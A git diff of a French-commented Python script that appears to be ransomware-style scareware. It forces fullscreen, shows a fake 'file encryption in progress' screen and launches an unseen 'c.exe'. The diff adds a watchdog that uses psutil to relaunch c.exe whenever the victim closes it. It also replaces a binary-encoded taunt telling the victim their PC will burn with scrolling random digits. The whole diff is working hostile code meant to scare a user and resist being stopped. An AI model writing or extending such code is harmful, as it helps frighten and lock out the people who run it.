@@ -1,6 +1,6 @@
 # encoding UTF-8
+import os, time, pyautogui, threading, keyboard, random, psutil
 from colored import fg, attr, bg
-import os, time, pyautogui, threading, keyboard
 
 # Var
 running = True
@@ -10,7 +10,7 @@ is_crypting = False
 
 # Paramètres du cmd
 os.system("@echo off")
-os.system("title Password")
+os.system("title PASSWORD")
 os.system("cls")
 pyautogui.press("F11")
 
@@ -29,15 +29,23 @@ def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
     global running
     global is_crypting
     
-    while running and not is_crypting:
-        os.system("color 4a")
+    while running and not is_crypting: # Si le programme est lancé mais le cryptage n'a pas commencé
+        os.system("color 4a") # Fond rouge police verte
         time.sleep(0.1)
-    while is_crypting:
-        os.system("color a")
+    while is_crypting: # Si le cryptage a commencé
+        os.system("color a") # Fond noir police verte
         time.sleep(0.1)
+        
+def CantCloseCrypting(): # Fonction pour empêcher l'utilisateur de quitter le cryptage
+    
+    global is_crypting
+    
+    while True:
+        if is_crypting: # Si le cryptage a commencé
+            if "c.exe" not in (p.name() for p in psutil.process_iter()): os.system("start c.exe"), time.sleep(1.5) # Relancer le cryptage si il n'a pas commencé
 
-# Fonction principale
-def Main():
+
+def Main(): # Fonction principale
     
     global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
     global running
@@ -64,9 +72,15 @@ def Main():
                 print("CRYPTAGE DES FICHIERS EN COURS")
                 time.sleep(1)
                 os.system("start c.exe")
-                is_crypting = True
+                time.sleep(1)
+                is_crypting = True # Indiquer aux autres fonctions que le cryptage a commencé
                 while True:
-                    os.system("echo 01001100 01101111 01101100 00100000 01110100 00100111 01100001 01110011 00100000 01101100 01100001 01101110 01100011 11000011 10101001 00100000 01110101 01101110 00100000 01110110 01101001 01110010 01110101 01110011 00100000 01110011 01110101 01110010 00100000 01110100 01101111 01101110 00100000 01101111 01110010 01100100 01101001 01101110 01100001 01110100 01100101 01110101 01110010 00100000 01110011 01100001 01101100 01100101 00100000 01101110 01101111 01101111 01100010 00101100 00100000 01110100 01101111 01101110 00100000 01110000 01100011 00100000 01110110 01100001 00100000 01100010 01110010 11000011 10111011 01101100 01100101 01110010 00100000 01101101 01100100 01110010 00100000 00100001 00100001")
+                    char = ""
+                    for i in range(237): # 237 = nombre de caractère max par ligne sur le cmd
+                        if random.choice([-1, 0, 1]) == 0: char += " " # 1/3 chance d'ajouter un espace
+                        else: char += str(random.randint(0, 9)) # Sinon on ajoute un chiffre au hasard
+                    os.system(f"echo {char}") # Puis on envoie avec f"" pour entrer une variable entre {}
+                    
 # Threads
 main = threading.Thread(target=Main)
 wait_f11 = threading.Thread(target=WaitF11)
